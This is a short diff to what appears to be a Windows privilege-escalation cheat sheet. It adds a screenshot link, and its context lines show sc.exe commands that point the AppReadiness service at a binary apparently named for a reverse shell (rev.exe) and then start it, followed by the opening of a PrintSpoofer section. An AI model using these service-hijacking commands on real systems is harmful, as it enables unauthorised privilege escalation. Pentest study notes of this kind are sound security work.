@@ -289,6 +289,8 @@ sc.exe config AppReadiness binPath= "C:\users\svc-printer\documents\rev.exe"
 sc start AppReadiness
 ```
 ![image](https://github.com/user-attachments/assets/b3dee6e9-4c6f-4324-8af8-3d95e0650cec)
+![image](https://github.com/user-attachments/assets/e9a421db-8fce-4d1e-8284-59927a883115)
+
 ##### Named Pipes(PrintSpoofer)
 ```
 Requirements: SeImpersonatePrivilege has to be enabled
